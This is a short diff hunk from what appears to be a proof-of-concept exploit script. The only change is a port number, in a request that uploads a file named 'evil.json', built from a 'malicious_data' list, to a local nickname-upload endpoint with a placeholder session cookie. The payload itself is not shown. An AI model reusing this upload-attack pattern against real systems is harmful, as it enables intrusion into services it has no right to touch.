@@ -180,7 +180,7 @@ malicious_data = [
 ]
 
 response = requests.post(
-    "http://localhost:5432/web/nicknames/upload",
+    "http://localhost:5480/web/nicknames/upload",
     files={"file": ("evil.json", json.dumps(malicious_data))},
     cookies={"session": "your_session"}
 )
